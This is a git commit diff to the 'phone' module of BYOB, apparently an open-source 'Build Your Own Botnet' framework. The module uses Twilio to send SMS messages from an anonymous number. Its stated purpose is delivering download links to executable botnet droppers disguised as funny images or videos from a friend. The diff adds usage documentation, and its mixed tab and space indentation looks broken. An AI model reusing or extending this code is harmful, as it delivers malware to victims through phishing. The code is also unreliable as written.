6f5558af8f2c3780e027d762828ce33cc9af05a1
malwaredllc <danielvegamyhre@gmail.com>
2018-11-14 11:44:40 -0700

    Added usage information to Phone module

--- byob/modules/phone.py
+++ byob/modules/phone.py
@@ -2,15 +2,11 @@
 # -*- coding: utf-8 -*-
 'Phone SMS Text Message (Build Your Own Botnet)'
 
-# standard library
-import Queue
-
 # packages
 import twilio.rest
 
 # globals
 command = True
-results = Queue.Queue()
 packages = ['twilio']
 platforms = ['win32','linux2','darwin']
 results = {}
@@ -18,13 +14,26 @@ usage = 'phone [sid=SID] [token=TOKEN] [number=NUMBER] [message=MESSAGE]'
 description = """
 Use an anonymous online phone number to send an SMS text message
 containing download links to executable client droppers disguised
-as a link to a funny image/video on Imgur/YouTUbe sent from a friend
+as a link to a funny image/video on Imgur/YouTube sent from a friend
 """
 
 # main
 def run(message=None, number=None, sid=None, token=None):
-    try:
-        number = '+{}'.format(str().join([i for i in str(number) if str(i).isdigit()]))
+	"""
+	Send a SMS text message from an anonymous online phone
+	number via Twilio
+
+	`Required`
+	:param str message:		text message body
+	:param str number: 		recipient phone number
+	:param str sid:			Twilio account SID
+	:param str token:		Twilio account auth token
+
+	"""
+	try:
+		if not all([message, number, sid, token]):
+			return globals()['usage']
+	    number = '+{}'.format(str().join([i for i in str(number) if str(i).isdigit()]))
         cli = twilio.rest.Client(sid, token)
         phone = cli.outgoing_caller_ids.list()[0].phone_number
         msg = cli.api.account.messages.create(to=number, from_=phone, body=message)
